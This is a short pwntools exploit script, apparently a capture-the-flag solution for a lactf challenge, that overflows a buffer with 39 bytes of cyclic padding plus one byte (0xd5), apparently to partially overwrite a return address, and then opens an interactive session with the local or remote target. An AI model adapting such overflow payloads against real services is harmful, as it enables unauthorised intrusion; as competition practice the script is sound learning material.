from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)
libc = e.libc

gs = '''
break *$rebase(0x133b)
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("lac.tf",31121)
    else:
        return process(e.path)


p = start()
chain = cyclic(39)
chain += b'\xd5'
p.sendline(chain)
p.interactive()
